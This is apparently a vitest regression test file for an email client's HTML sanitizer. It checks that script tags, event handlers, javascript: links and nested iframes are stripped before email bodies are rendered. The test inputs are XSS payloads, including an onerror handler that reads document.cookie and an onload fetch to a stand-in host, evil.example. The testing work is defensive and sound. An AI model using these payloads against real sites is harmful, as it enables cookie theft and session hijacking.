/**
 * emailBodySanitize — security-hardening regression guard.
 *
 * Defensive maintenance: the email-body iframe `srcDoc` sinks in
 * InboxWidget / InboxZero / GlobalAuditTab render attacker-controlled email
 * HTML. All of them now route the body through the central `sanitizeHtml`
 * (DOMPurify) gate BEFORE injection. These tests assert that the sanitizer
 * strips the script-injection vectors an email body could carry, so a
 * regression that re-introduces a raw sink (or weakens the allowlist) fails
 * here instead of shipping an XSS.
 *
 * NOTE: this exercises the SAME function the sinks call (`sanitizeHtml` from
 * src/utils/safeMarkdown), which is the exact value interpolated into srcDoc.
 */
import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from '../utils/safeMarkdown';

describe('email-body sanitizer (iframe srcDoc gate)', () => {
    it('strips <script> tags from an email body', () => {
        const dirty = '<p>Hi there</p><script>window.__pwned = 1;</script>';
        const clean = sanitizeHtml(dirty);
        expect(clean).not.toContain('<script');
        expect(clean).not.toContain('window.__pwned');
        // benign content survives
        expect(clean).toContain('Hi there');
    });

    it('strips inline event handlers like onerror on <img>', () => {
        const dirty = '<img src="x" onerror="alert(document.cookie)">';
        const clean = sanitizeHtml(dirty);
        expect(clean).not.toContain('onerror');
        expect(clean).not.toContain('alert(');
        expect(clean.toLowerCase()).not.toContain('document.cookie');
    });

    it('strips javascript: URLs from links', () => {
        const dirty = '<a href="javascript:alert(1)">click</a>';
        const clean = sanitizeHtml(dirty);
        expect(clean.toLowerCase()).not.toContain('javascript:');
    });

    it('strips <iframe> nested inside an email body', () => {
        const dirty = '<iframe src="https://evil.example/steal"></iframe>';
        const clean = sanitizeHtml(dirty);
        expect(clean).not.toContain('<iframe');
        expect(clean).not.toContain('evil.example');
    });

    it('strips onload handlers on the body wrapper', () => {
        const dirty = '<body onload="fetch(\'//evil.example\')">copy</body>';
        const clean = sanitizeHtml(dirty);
        expect(clean).not.toContain('onload');
        expect(clean).not.toContain('evil.example');
    });

    it('preserves safe formatting (bold, links, images) that legit emails use', () => {
        const dirty =
            '<p><strong>Invoice</strong> <a href="https://example.com/pay">pay now</a> ' +
            '<img src="https://example.com/logo.png" alt="logo"></p>';
        const clean = sanitizeHtml(dirty);
        expect(clean).toContain('<strong>');
        expect(clean).toContain('href="https://example.com/pay"');
        expect(clean).toContain('src="https://example.com/logo.png"');
    });

    it('is idempotent and never emits a raw <script> even on double-encoded payloads', () => {
        // A body that tries to smuggle a script via the snippet/fallback path.
        const dirty = '<div>summary</div><svg><script>1</script></svg>';
        const clean = sanitizeHtml(dirty);
        expect(clean).not.toContain('<script');
        // sanitizing the already-clean output changes nothing
        expect(sanitizeHtml(clean)).toBe(clean);
    });
});
